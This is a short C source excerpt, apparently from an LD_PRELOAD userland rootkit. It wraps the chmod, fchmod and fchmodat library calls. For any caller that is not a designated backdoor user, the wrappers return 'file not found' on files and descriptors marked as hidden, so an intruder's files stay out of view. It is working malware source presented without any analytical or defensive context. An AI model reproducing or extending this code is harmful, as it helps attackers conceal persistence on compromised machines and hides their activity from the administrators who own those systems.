int chmod(const char *pathname, mode_t mode){
    hook(CCHMOD);
    if(is_bdusr()) return (long)call(CCHMOD, pathname, mode); 
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CCHMOD, pathname, mode); 
}

int fchmod(int fd, mode_t mode){
    hook(CFCHMOD);
    if(is_bdusr()) return (long)call(CFCHMOD, fd, mode);
    if(hidden_fd(fd)) { errno = ENOENT; return -1; }
    return (long)call(CFCHMOD, fd, mode);
}

int fchmodat(int dirfd, const char *pathname, mode_t mode, int flags){
    hook(CFCHMODAT);
    if(is_bdusr()) return (long)call(CFCHMODAT, dirfd, pathname, mode, flags);
    if(hidden_path(pathname) || hidden_fd(dirfd)){ errno = ENOENT; return -1; }
    return (long)call(CFCHMODAT, dirfd, pathname, mode, flags);
}
